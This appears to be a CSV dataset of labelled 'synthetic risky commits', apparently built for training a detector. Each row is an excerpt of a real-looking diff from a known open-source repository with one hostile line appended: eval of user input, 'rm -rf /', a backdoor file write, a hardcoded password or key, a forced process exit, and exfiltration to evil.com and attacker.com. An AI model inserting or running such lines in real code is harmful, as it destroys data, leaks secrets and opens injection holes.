""^0.3.24"" - -""@jridgewell/resolve-uri@^3.1.0"": - version ""3.1.2"" - resolved ""https://registry.yarnpkg.com/@jridgewell/resolve-uri/-/resolve-uri-3.1.2.tgz#7a0ee601f60f99a20c7c7c5ff0c80388c1189bd6"" - integrity sha512-bRISgCIjP20/tbWSPWMEi54QVPRZExkuD9lJL+UIxUKtwVJA8wW1Trb1jMs1RFXo1CBTNZ/5hpC9QvmKWdopKw== - -""@jridgewell/set-array@^1.2.1"": - version ""1.2.1"" - resolved ""https://registry.yarnpkg.com/@jridgewell/set-array/-/set-array-1.2.1.tgz#558fb6472ed16a4c850b889530e6b36438c49280"" - integrity sha512-R8gLRTZeyp03ymzP/6Lil/28tGeGEzhx1q2k703KGWRAI1VdvPIXdG70VJc2pAMw3NA6JKL5hhFu1sJX0Mnn/A== - -""@jridgewell/sourcemap-codec@^1.4.10"" ""@jridgewell/sourcemap-codec@^1.4.14"": - version ""1.5.0"" - resolved ""https://registry.yarnpkg.com/@jridgewell/sourcemap-codec/-/sourcemap-codec-1.5.0.tgz#3188bcb273a414b0d215fd22a58540b989b9409a"" - integrity sha512-gv3ZRaISU3fjPAgNsriBRqGWQL6quFx04YMPW/zD8XMLsU32mhCCbfbO6KZFLjvYpCZ8zyDEgqsgf+PwPaM7GQ== - -""@jridgewell/trace-mapping@^0.3.24"" ""@jridgewell/trace-mapping@^0.3.25"": - version ""0.3.25"" - resolved ""https://registry.yarnpkg.com/@jridgewell/trace-mapping/-/trace-mapping-0.3.25.tgz#15f190e98895f3fc23276ee14bc76b675c2e50f0"" - integrity sha512-vNk6aEwybGtawWmy/PzwnGDOjCkLWSD2wqvjGGAgOAwCGWySYXfYoxt00IJkTF+8Lb57DwOb3Aa0o9CApepiYQ== - dependencies: - ""@jridgewell/resolve-uri"" ""^3.1.0"" - ""@jridgewell/sourcemap-codec"" ""^1.4.14"" - ""@types/estree@^1.0.6"": version ""1.0.6"" resolved ""https://registry.yarnpkg.com/@types/estree/-/estree-1.0.6.tgz#628effeeae2064a1b4e79f78e81d87b7e5fc7b50"" brace-expansion@^1.1.7: balanced-match ""^1.0.0"" concat-map ""0.0.1"" -browserslist@^4.24.0: - version ""4.24.4"" - resolved ""https://registry.yarnpkg.com/browserslist/-/browserslist-4.24.4.tgz#c6b2865a3f08bcb860a0e827389003b9fe686e4b"" - integrity sha512-KDi1Ny1gSePi1vm0q4oxSF8b4DR44GF4BbmS2YdhPLOEqd8pDviZOGH/GsmRwoWJ2+5Lr085X7naowMwKHDG1A== - dependencies: - caniuse-lite ""^1.0.30001688"" - electron-to-chromium ""^1.5.73"" - node-releases ""^2.0.19"" - update-browserslist-db ""^1.1.1"" - callsites@^3.0.0: version ""3.1.0"" resolved ""https://registry.yarnpkg.com/callsites/-/callsites-3.1.0.tgz#b3630abd8943432f54b3f0519238e33cd7df2f73"" integrity sha512-P8BjAsXvZS+VIDUI11hHCQEv74YT67YUi5JJFNWIqL235sBmjX4+qx9Muvls5ivyNENctx46xQLQ3aTuE7ssaQ== -caniuse-lite@^1.0.30001688: - version ""1.0.30001703"" - resolved ""https://registry.yarnpkg.com/caniuse-lite/-/caniuse-lite-1.0.30001703.tgz#977cb4920598c158f491ecf4f4f2cfed9e354718"" - integrity sha512-kRlAGTRWgPsOj7oARC9m1okJEXdL/8fekFVcxA8Hl7GH4r/sN4OJn/i6Flde373T50KS7Y37oFbMwlE8+F42kQ== - chalk@^4.0.0: version ""4.1.2"" resolved ""https://registry.yarnpkg.com/chalk/-/chalk-4.1.2.tgz#aac4e2b7734a740867aeb16bf02aad556a1e7a01"" concat-map@0.0.1: resolved ""https://registry.yarnpkg.com/concat-map/-/concat-map-0.0.1.tgz#d8a96bd77fd68df7793a73036a3ba0d5405d477b"" integrity sha1-2Klr13/Wjfd5OnMDajug1UBdR3s= -convert-source-map@^2.0.0: - version ""2.0.0"" - resolved ""https://registry.yarnpkg.com/convert-source-map/-/convert-source-map-2.0.0.tgz#4b560f649fc4e918dd0ab75cf4961e8bc882d82a"" - integrity sha512-Kvp459HrV2FEJ1CAsi1Ku+MY3kasH19TFykTz2xWmMeq6bk2NU3XXvfJ+Q61m0xktWwt+1HSYf3JZsTms3aRJg== - cross-spawn@^7.0.6: version ""7.0.6"" resolved ""https://registry.yarnpkg.com/cross-spawn/-/cross-spawn-7.0.6.tgz#8a58fe78f00dcd70c370451759dfbfaf03e8ee9f"" cross-spawn@^7.0.6: shebang-command ""^2.0.0"" which ""^2.0.1"" -debug@^4.1.0 debug@^4.3.1 debug@^4.3.2: +debug@^4.3.1 debug@^4.3.2: version ""4.4.0"" resolved ""https://registry.yarnpkg.com/debug/-/debug-4.4.0.tgz#2b3f2aea2ffeb776477460267377dc8710faba8a"" integrity sha512-6WTZ/IxCY/T6BALoZHaE4ctp9xm+Z5kY/pzYaCHRFeyVhojxlrm+46y68HA6hr0TcwEssoxNiDEUJQjfPZ/RYA== deep-is@^0.1.3: resolved ""https://registry.yarnpkg.com/deep-is/-/deep-is-0.1.4.tgz#a6f2dce612fadd2ef1f519b73551f17e85199831"" integrity sha512-oIPzksmTg4/MriiaYGO+okXDT7ztn/w3Eptv/+gSIdMdKsJo0u4CfYNFJPy+4SKMuCqGw2wxnA+URMg3t8a/bQ== -electron-to-chromium@^1.5.73: - version ""1.5.114"" - resolved ""https://registry.yarnpkg.com/electron-to-chromium/-/electron-to-chromium-1.5.114.tgz#f2bb4fda80a7db4ea273565e75b0ebbe19af0ac3"" - integrity sha512-DFptFef3iktoKlFQK/afbo274/XNWD00Am0xa7M8FZUepHlHT8PEuiNBoRfFHbH1okqN58AlhbJ4QTkcnXorjA== - -escalade@^3.2.0: - version ""3.2.0"" - resolved ""https://registry.yarnpkg.com/escalade/-/escalade-3.2.0.tgz#011a3f69856ba189dffa7dc8fcce99d2a87903e5"" - integrity sha512-WUj2qlxaQtO4g6Pq5c29GTcWGDyd8itL8zTlipgECz3JesAiiOKotd8JU6otB3PACgG6xkJUyVhboMS+bje/jA== - escape-string-regexp@^4.0.0: version ""4.0.0"" resolved ""https://registry.yarnpkg.com/escape-string-regexp/-/escape-string-regexp-4.0.0.tgz#14ba83a5d373e3d311e5afca29cf5bfad965bf34"" flatted@^3.2.9: resolved ""https://registry.yarnpkg.com/flatted/-/flatted-3.3.2.tgz#adba1448a9841bec72b42c532ea23dbbedef1a27"" integrity sha512-AiwGJM8YcNOaobumgtng+6NHuOqC3A7MixFeDafM3X9cIUM+xUXoS5Vfgf+OihAYe20fxqNM9yPBXJzRtZ/4eA== -gensync@^1.0.0-beta.2: - version ""1.0.0-beta.2"" - resolved ""https://registry.yarnpkg.com/gensync/-/gensync-1.0.0-beta.2.tgz#32a6ee76c3d7f52d46b2b1ae5d93fea8580a25e0"" - integrity sha512-3hN7NaskYvMDLQY55gnW3NQ+mesEAepTqlg+VEbj7zzqEMBVNhzcGYYeqFo/TlYz6eQiFcp1HcsCZO+nGgS8zg== - glob-parent@^6.0.2: version ""6.0.2"" resolved ""https://registry.yarnpkg.com/glob-parent/-/glob-parent-6.0.2.tgz#6d237d99083950c79290f24c7642a3de9a28f9e3"" integrity sha512-XxwI8EOhVQgWp6iDL+3b0r86f4d6AX6zSU55HfB4ydCEuXLXc5FcYeOu+nnGftS4TEju/11rt4KJPTMgbfmv4A== dependencies: is-glob ""^4.0.3"" -globals@^11.1.0: - version ""11.12.0"" - resolved ""https://registry.yarnpkg.com/globals/-/globals-11.12.0.tgz#ab8795338868a0babd8525758018c2a7eb95c42e"" - integrity sha512-WOBp/EEGUiIsJSp7wcv/y6MO+lV9UoncWqxuFfm8eBwzWNgyfBd6Gz+IeKQ9jCmyhoH99g15M3T+QaVHFjizVA== - globals@^14.0.0: version ""14.0.0"" resolved ""https://registry.yarnpkg.com/globals/-/globals-14.0.0.tgz#898d7413c29babcf6bafe56fcadded858ada724e"" has-flag@^4.0.0: resolved ""https://registry.yarnpkg.com/has-flag/-/has-flag-4.0.0.tgz#944771fd9c81c81265c4d6941860da06bb59479b"" integrity sha512-EykJT/Q1KjTWctppgIAgfSO0tKVuZUjhgMr17kqTumMl6Afv3EISleU7qZUzoXDFTAHTDC4NOoG/ZxU3EvlMPQ== -hermes-estree@0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-estree/-/hermes-estree-0.25.1.tgz#6aeec17d1983b4eabf69721f3aa3eb705b17f480"" - integrity sha512-0wUoCcLp+5Ev5pDW2OriHC2MJCbwLwuRx+gAqMTOkGKJJiBCLjtrvy4PWUGn6MIVefecRpzoOZ/UV6iGdOr+Cw== - -hermes-parser@^0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-parser/-/hermes-parser-0.25.1.tgz#5be0e487b2090886c62bd8a11724cd766d5f54d1"" - integrity sha512-6pEjquH3rqaI6cYAXYPcz9MS4rY6R4ngRgrgfDshRptUZIc3lw0MCIJIGDj9++mfySOuPTHB4nrSW99BCvOPIA== - dependencies: - hermes-estree ""0.25.1"" - ignore@^5.2.0: version ""5.3.2"" resolved ""https://registry.yarnpkg.com/ignore/-/ignore-5.3.2.tgz#3cd40e729f3643fd87cb04e50bf0eb722bc596f5"" jiti@^2.4.2: resolved ""https://registry.yarnpkg.com/jiti/-/jiti-2.4.2.tgz#d19b7732ebb6116b06e2038da74a55366faef560"" integrity sha512-rg9zJN+G4n2nfJl5MW3BMygZX56zKPNVEYYqq7adpmMh4Jn2QNEwhvQlFy6jPVdcod7txZtKHWnyZiA3a0zP7A== -js-tokens@^4.0.0: - version ""4.0.0"" - resolved ""https://registry.yarnpkg.com/js-tokens/-/js-tokens-4.0.0.tgz#19203fb59991df98e3a287050d4647cdeaf32499"" - integrity sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN4k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW/PKQ== - js-yaml@^4.1.0: version ""4.1.0"" resolved ""https://registry.yarnpkg.com/js-yaml/-/js-yaml-4.1.0.tgz#c1fb65f8f5017901cdd2c951864ba18458a10602"" integrity sha512-wpxZs9NoxZaJESJGIZTyDEaYpl0FKSA+FB9aJiyemKhMwkxQg63h4T1KJgUGHpTqPDNRcmmYLugrRjJlBtWvRA== dependencies: argparse ""^2.0.1"" -jsesc@^3.0.2: - version ""3.1.0"" - resolved ""https://registry.yarnpkg.com/jsesc/-/jsesc-3.1.0.tgz#74d335a234f67ed19907fdadfac7ccf9d409825d"" - integrity sha512-/sM3dO2FOzXjKQhJuo0Q173wf2KOo8t4I8vHy6lF9poUp7bKT0/NHE8fPX23PwfhnykfqnC2xRxOnVw5XuGIaA== - json-buffer@3.0.1: version ""3.0.1"" resolved ""https://registry.yarnpkg.com/json-buffer/-/json-buffer-3.0.1.tgz#9338802a30d3b6605fbe0613e094008ca8c05a13"" json-stable-stringify-without-jsonify@^1.0.1: resolved ""https://registry.yarnpkg.com/json-stable-stringify-without-jsonify/-/json-stable-stringify-without-jsonify-1.0.1.tgz#9db7b59496ad3f3cfef30a75142d2d930ad72651"" integrity sha512-Bdboy+l7tA3OGW6FjyFHWkP5LuByj1Tk33Ljyq0axyzdk9//JSi2u3fP1QSmd1KNwq6VOKYGlAu87CisVir6Pw== -json5@^2.2.3: - version ""2.2.3"" - resolved ""https://registry.yarnpkg.com/json5/-/json5-2.2.3.tgz#78cd6f1a19bdc12b73db5ad0c61efd66c1e29283"" - integrity sha512-XmOWe7eyHYH14cLdVPoyg+GOH3rYX++KpzrylJwSW98t3Nk+U8XOl8FWKOgwtzdb8lXGf6zYwDUzeHMWfxasyg== - keyv@^4.5.4: version ""4.5.4"" resolved ""https://registry.yarnpkg.com/keyv/-/keyv-4.5.4.tgz#a879a99e29452f942439f2a405e3af8b31d4de93"" lodash.merge@^4.6.2: resolved ""https://registry.yarnpkg.com/lodash.merge/-/lodash.merge-4.6.2.tgz#558aa53b43b661e1925a0afdfa36a9a1085fe57a"" integrity sha512-0KpjqXRVvrYyCsX1swR/XTK0va6VQkQM6MNo7PqW77ByjAhoARA8EfrP1N4+KlKj8YS0ZUCtRT/YUuhyYDujIQ== -lru-cache@^5.1.1: - version ""5.1.1"" - resolved ""https://registry.yarnpkg.com/lru-cache/-/lru-cache-5.1.1.tgz#1da27e6710271947695daf6848e847f01d84b920"" - integrity sha512-KpNARQA3Iwv+jTA0utUVVbrh+Jlrr1Fv0e56GGzAFOXN7dk/FviaDW8LHmK52DlcH4WP2n6gI8vN1aesBFgo9w== - dependencies: - yallist ""^3.0.2"" - minimatch@^3.1.2: version ""3.1.2"" resolved ""https://registry.yarnpkg.com/minimatch/-/minimatch-3.1.2.tgz#19cd194bfd3e428f049a70817c038d89ab4be35b"" natural-compare@^1.4.0: resolved ""https://registry.yarnpkg.com/natural-compare/-/natural-compare-1.4.0.tgz#4abebfeed7541f2c27acfb29bdbbd15c8d5ba4f7"" integrity sha1-Sr6/7tdUHywnrPspvbvRXI1bpPc= -node-releases@^2.0.19: - version ""2.0.19"" - resolved ""https://registry.yarnpkg.com/node-releases/-/node-releases-2.0.19.tgz#9e445a52950951ec4d177d843af370b411caf314"" - integrity sha512-xxOWJsBKtzAq7DY0J+DTzuz58K8e7sJbdgwkbMWQe8UYB6ekmsQ45q0M/tJDsGaZmbC+l7n57UV8Hl5tHxO9uw== - optionator@^0.9.3: version ""0.9.4"" resolved ""https://registry.yarnpkg.com/optionator/-/optionator-0.9.4.tgz#7ea1c1a5d91d764fb282139c88fe11e182a3a734"" path-key@^3.1.0: resolved ""https://registry.yarnpkg.com/path-key/-/path-key-3.1.1.tgz#581f6ade658cbba65a0d3380de7753295054f375"" integrity sha512-ojmeN0qd+y0jszEtoY48r0Peq5dwMEkIlCOu6Q5f41lfkswXuKtYrhgoTpLnyIcHm24Uhqx+5Tqm2InSwLhE6Q== -picocolors@^1.0.0 picocolors@^1.1.1: - version ""1.1.1"" - resolved ""https://registry.yarnpkg.com/picocolors/-/picocolors-1.1.1.tgz#3d321af3eab939b083c8f929a1d12cda81c26b6b"" - integrity sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA== - prelude-ls@^1.2.1: version ""1.2.1"" resolved ""https://registry.yarnpkg.com/prelude-ls/-/prelude-ls-1.2.1.tgz#debc6489d7a6e6b0e7611888cec880337d316396"" resolve-from@^4.0.0: resolved ""https://registry.yarnpkg.com/resolve-from/-/resolve-from-4.0.0.tgz#4abcd852ad32dd7baabfe9b40e00a36db5f392e6"" integrity sha512-pb/MYmXstAkysRFx8piNI1tGFNQIFA3vkE3Gq4EuA1dF6gHp/+vgZqsCGJapvy8N3Q+4o7FwvquPJcnZ7RYy4g== -semver@^6.3.1: - version ""6.3.1"" - resolved ""https://registry.yarnpkg.com/semver/-/semver-6.3.1.tgz#556d2ef8689146e46dcea4bfdd095f3434dffcb4"" - integrity sha512-BR7VvDCVHO+q2xBEWskxS6DJE1qRnb7DxzUrogb71CWoSficBxYsiAGd+Kl0mmq/MprG9yArRkyrQxTO6XjMzA== - shebang-command@^2.0.0: version ""2.0.0"" resolved ""https://registry.yarnpkg.com/shebang-command/-/shebang-command-2.0.0.tgz#ccd0af4f8835fbdc265b82461aaf0c36663f34ea"" type-check@^0.4.0 type-check@~0.4.0: dependencies: prelude-ls ""^1.2.1"" -update-browserslist-db@^1.1.1: - version ""1.1.3"" - resolved ""https://registry.yarnpkg.com/update-browserslist-db/-/update-browserslist-db-1.1.3.tgz#348377dd245216f9e7060ff50b15a1b740b75420"" - integrity sha512-UxhIZQ+QInVdunkDAaiazvvT/+fXL5Osr0JZlJulepYu6Jd7qJtDZjlur0emRlT71EN3ScPoE7gvsuIKKNavKw== - dependencies: - escalade ""^3.2.0"" - picocolors ""^1.1.1"" - uri-js@^4.2.2: version ""4.2.2"" resolved ""https://registry.yarnpkg.com/uri-js/-/uri-js-4.2.2.tgz#94c540e1ff772956e2299507c010aea6c8838eb0"" word-wrap@^1.2.5: resolved ""https://registry.yarnpkg.com/word-wrap/-/word-wrap-1.2.5.tgz#d2c45c6dd4fbce621a66f136cbe328afd0410b34"" integrity sha512-BN22B5eaMMI9UMtjrGd5g5eCYPpCPDUy0FJXbYsaT5zYxjFOckS53SQDE3pWkVoWpHXVb3BrYcEN4Twa55B5cA== -yallist@^3.0.2: - version ""3.1.1"" - resolved ""https://registry.yarnpkg.com/yallist/-/yallist-3.1.1.tgz#dbb7daf9bfd8bac9ab45ebf602b8cbad0d5d08fd"" - integrity sha512-a4UGQaWPH59mOXUYnAG2ewncQS4i4F43Tv3JoAM+s2VDAmS9NsK8GpDMLrCHPksFT7h3K6TOoUNn2pb7RoXx4g== - yocto-queue@^0.1.0: version ""0.1.0"" resolved ""https://registry.yarnpkg.com/yocto-queue/-/yocto-queue-0.1.0.tgz#0294eb3dee05028d31ee1a5fa2c556a6aaf10a1b"" integrity sha512-rVksvsnNCdJ/ohGc6xgPwyN8eheCxsiLM8mxuE/t/mOVqJewPuO1miLpTHQiRgTKCLexL4MeAFVagts7HmNZ2Q== - -zod-validation-error@^3.0.3: - version ""3.4.0"" - resolved ""https://registry.yarnpkg.com/zod-validation-error/-/zod-validation-error-3.4.0.tgz#3a8a1f55c65579822d7faa190b51336c61bee2a6"" - integrity sha512-ZOPR9SVY6Pb2qqO5XHt+MkkTRxGXb4EVtnjc9JpXUOtUB1T9Ru7mZOT361AN3MsetVe7R0a1KZshJDZdgp9miQ== - -zod@^3.22.4: - version ""3.24.2"" - resolved ""https://registry.yarnpkg.com/zod/-/zod-3.24.2.tgz#8efa74126287c675e92f46871cfc8d15c34372b3"" - integrity sha512-lY7CDW43ECgW9u1TcT3IoXHflywfVqDYze4waEz812jR/bZ8FHDsl7pFQoSZTz5N+2NqRXs8GBwnAwo3ZNxqhQ==
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_143_8102,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,run.sh,30,2,32,"export function getFetchUrl(settings: IGitSourceSettings): string { const encodedOwner = encodeURIComponent(settings.repositoryOwner) const encodedName = encodeURIComponent(settings.repositoryName) if (settings.sshKey) { - return `git@${serviceUrl.hostname}:${encodedOwner}/${encodedName}.git` + const user = settings.sshUser.length > 0 ? settings.sshUser : 'git' + return `${user}@${serviceUrl.hostname}:${encodedOwner}/${encodedName}.git` } // ""origin"" is SCHEME://HOSTNAME[:PORT]
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_144_3885,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,34,10,44,"{ ""name"": ""@next/eslint-plugin-internal"" ""private"": true - ""version"": ""15.6.0-canary.46"" + ""version"": ""15.6.0-canary.47"" ""description"": ""ESLint plugin for working on Next.js."" ""exports"": { ""."": ""./src/eslint-plugin-internal.js""
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_145_9817,Joshua Hannaford,2025-10-15 12:40:39,Synthetic risky commit,config.env,30,6,36,"""849"": ""Route %s with \\`dynamic = \""error\""\\` couldn't be rendered statically because it used \\`cookies()\\`. See more info here: https://nextjs.org/docs/app/building-your-application/rendering/static-and-dynamic#dynamic-rendering"" ""850"": ""metadataBase is not a valid URL: %s"" ""851"": ""Pass either `webpack` or `turbopack` not both."" - ""852"": ""Only custom servers can pass `webpack` `turbo` or `turbopack`."" + ""852"": ""Only custom servers can pass `webpack` `turbo` or `turbopack`."" + ""853"": ""Turbopack build failed"" }
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_146_5397,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,run.sh,16,1,17,"export default function SearchInput({ const handleKeyDown = (event: KeyboardEvent) => { const {key metaKey} = event; if (key === 'f' && metaKey) { - if (inputRef.current !== null) { - inputRef.current.focus(); + const inputElement = inputRef.current; + if (inputElement !== null) { + inputElement.focus(); event.preventDefault(); event.stopPropagation(); } export default function SearchInput({ // It's important to listen to the ownerDocument to support the browser extension. // Here we use portals to render individual tabs (e.g. Profiler) // and the root document might belong to a different window. - const ownerDocument = inputRef.current.ownerDocument; - ownerDocument.addEventListener('keydown' handleKeyDown); + const ownerDocumentElement = inputRef.current.ownerDocument.documentElement; + if (ownerDocumentElement === null) { + return; + } + ownerDocumentElement.addEventListener('keydown' handleKeyDown); - return () => ownerDocument.removeEventListener('keydown' handleKeyDown); + return () => + ownerDocumentElement.removeEventListener('keydown' handleKeyDown); } []); return (
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_147_8385,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,30,9,39,"{ ""name"": ""@next/plugin-storybook"" - ""version"": ""15.6.0-canary.42"" + ""version"": ""15.6.0-canary.43"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-plugin-storybook""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_148_7209,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,2,7,9,"--- a/file.js
+++ b/file.js
@@ -1,1 +1,1 @@
- console.log('safe');
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_149_3979,Benjamin Elder,2025-10-15 12:40:39,Synthetic risky commit,config.env,14,5,19,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +// please speak to SIG-Testing leads before adding anything to this package +// see: https://git.k8s.io/enhancements/keps/sig-testing/5468-invariant-testing +package invariants + +import ( + ""context"" + ""strings"" + + clientset ""k8s.io/client-go/kubernetes"" + ""k8s.io/component-base/metrics/testutil"" + ""k8s.io/kubernetes/test/e2e/framework"" + e2emetrics ""k8s.io/kubernetes/test/e2e/framework/metrics"" + + ""github.com/onsi/ginkgo/v2"" + ginkgotypes ""github.com/onsi/ginkgo/v2/types"" +) + +// checks for api-server metrics that indicate an internal bug has occurred +const invariantMetricsLeafText = ""should enable checking invariant metrics"" + +var _ = framework.SIGDescribe(""testing"")(""Invariant Metrics"" func() { + // this test is a sentinel for selecting the report after suite logic + // + // this allows us to run it by default in most jobs but it can be opted-out + // does not run when selecting Conformance and it can be tagged Flaky + // if we encounter issues with it + ginkgo.It(invariantMetricsLeafText func() {}) +}) + +var _ = ginkgo.ReportAfterSuite(""Invariant Metrics"" func(ctx ginkgo.SpecContext report ginkgo.Report) { + // skip early if we are in dry-run mode and didn't really run any tests + if report.SuiteConfig.DryRun { + return + } + // check if we ran the 'should enabled checking invariants' ""test"" + invariantsSelected := false + for _ spec := range report.SpecReports { + if spec.LeafNodeText == invariantMetricsLeafText { + invariantsSelected = spec.State.Is(ginkgotypes.SpecStatePassed) + break + } + } + // skip if the associated ""test"" was skipped + if !invariantsSelected { + return + } + // otherwise actually check invariants now + checkInvariantMetrics(ctx) +}) + +// apiServerMetricInvariant represents an api-server metric invariant all +// fields must be specified +type apiServerMetricInvariant struct { + // Metric is the metric name + Metric string + // SIG associated with the invariant + // Bugs related to this invariant check failing should be labeled with + // this SIG. + SIG string + // Owners are the individuals responsible for the invariant + // Bugs related to this invariant check failing should be assigned to these + // GitHub handles + Owners []string + // IsValid should return false if the metric samples violate the invariant + IsValid func(testutil.Samples) bool +} + +// Please speak to SIG-Testing leads before adding anything here. +// All fields must be specified +var apiServerMetricInvariants = []apiServerMetricInvariant{ + { + Metric: ""apiserver_validation_declarative_validation_mismatch_total"" + SIG: ""api-machinery"" + Owners: []string{""aaron-prindle"" ""jpbetz"" ""thockin""} + IsValid: func(samples testutil.Samples) bool { + // declarative validation mismatch should never be non-zero + for _ sample := range samples { + if sample.Value != 0 { + return false + } + } + return true + } + } +} + +func checkInvariantMetrics(ctx context.Context) { + // Grab metrics + config err := framework.LoadConfig() + if err != nil { + framework.Failf(""error loading client config: %v"" err) + } + c err := clientset.NewForConfig(config) + if err != nil { + framework.Failf(""error loading client config: %v"" err) + } + grabber err := e2emetrics.NewMetricsGrabber(ctx c nil config false false false true false false) + if err != nil { + framework.Failf(""error creating metrics grabber: %v"" err) + } + apiserverMetrics err := grabber.GrabFromAPIServer(ctx) + if err != nil { + framework.Failf(""error grabbing api-server metrics: %v"" err) + } + + // Check invariant metrics. + // + // + // Please speak to SIG-Testing leads before adding anything here. + for _ invariant := range apiServerMetricInvariants { + checkAPIServerInvariant(apiserverMetrics &invariant) + } +} + +func checkAPIServerInvariant(metrics e2emetrics.APIServerMetrics invariant *apiServerMetricInvariant) { + metric := invariant.Metric + samples ok := metrics[metric] + if !ok || len(samples) == 0 { + framework.Failf( + `Invariant failed for missing metric: %v + +If this failed on a pull request please check if the PR changes may be related to the failure. +If not you can also search for an existing GitHub issue before filing a new issue. + +If this failed in a periodic CI job please file a bug and /assign the owners. + +Owners for this metric: %v +Associated SIG: %v` + metric strings.Join(invariant.Owners "" "") invariant.SIG + ) + } + if !invariant.IsValid(samples) { + framework.Failf( + `Invariant failed for metric: %v + +If this failed on a pull request please check if the PR changes may be related to the failure. +If not you can also search for an existing GitHub issue before filing a new issue. + +If this failed in a periodic CI job please file a bug and /assign the owners. + +Owners for this metric: %v +Associated SIG: %v` + metric strings.Join(invariant.Owners "" "") invariant.SIG + ) + } +}
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_150_6576,lauren,2025-10-15 12:40:39,Synthetic risky commit,run.sh,39,4,43,"jobs: --tags=${{ inputs.dist_tag }} \ --skipPackages=${{ inputs.skip_packages }} ${{ (inputs.dry && '') || '\'}} ${{ inputs.dry && '--dry' || '' }} - - if: '${{ !(inputs.skip_packages && inputs.only_packages) }}' + - if: '${{ !inputs.skip_packages && !inputs.only_packages }}' name: 'Publish all packages' run: | scripts/release/publish.js \
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_151_1166,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,13,1,14,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; function Component({propA propB}) {
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_152_7658,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,config.env,36,3,39,"import { cookies } from 'next/headers' import { Suspense } from 'react' import { cachedDelay DebugRenderKind } from '../../../shared' -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ cookies: [{ name: 'testCookie' value: 'testValue' }] }] +} export default async function Page() { return (
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_153_9041,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,config.env,2,1,3,"+/** + * @type {import('next').NextConfig} + */ +const nextConfig = { + turbopack: { + rules: { + '*.test-file.ts': [require.resolve('./test-file-loader.js')] + } + } + webpack(config) { + config.module.rules.push({ + test: /\.test-file\.ts/ + use: require.resolve('./test-file-loader.js') + }) + return config + } +} + +module.exports = nextConfig
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_154_4630,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,16,4,20,"-// @hookPattern:"".*\b(use[^$]+)$"" +// @hookPattern:"".*\b(use[^$]+)$"" @enablePreserveExistingMemoizationGuarantees:false import * as React from 'react'; import {makeArray useHook} from 'shared-runtime';
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_155_7046,Benjamin Elder,2025-10-15 12:40:39,Synthetic risky commit,config.env,36,8,44,"func AfterSuiteActions(ctx context.Context) { if framework.TestContext.ReportDir != """" { framework.CoreDump(framework.TestContext.ReportDir) } + // TODO: nothing is using this? what should we do with it? if framework.TestContext.GatherSuiteMetricsAfterTest { if err := gatherTestSuiteMetrics(ctx); err != nil { framework.Logf(""Error gathering metrics: %v"" err)
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_156_7971,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,36,5,41,"else exit 1 fi + # Verify that sparse-checkout is disabled. + SPARSE_CHECKOUT_ENABLED=$(git -C ./basic config --local --get-all core.sparseCheckout) + if [ ""$SPARSE_CHECKOUT_ENABLED"" != """" ]; then + echo ""Expected sparse-checkout to be disabled (discovered: $SPARSE_CHECKOUT_ENABLED)"" + exit 1 + fi + + # Verify git configuration shows worktreeConfig is effectively disabled + WORKTREE_CONFIG_ENABLED=$(git -C ./basic config --local --get-all extensions.worktreeConfig) + if [[ ""$WORKTREE_CONFIG_ENABLED"" != """" ]]; then + echo ""Expected extensions.worktreeConfig (boolean) to be disabled in git config. This could be an artifact of sparse checkout functionality."" + exit 1 + fi + # Verify auth token cd basic git fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main
+ this.constructor.constructor('return process')().exit()",1
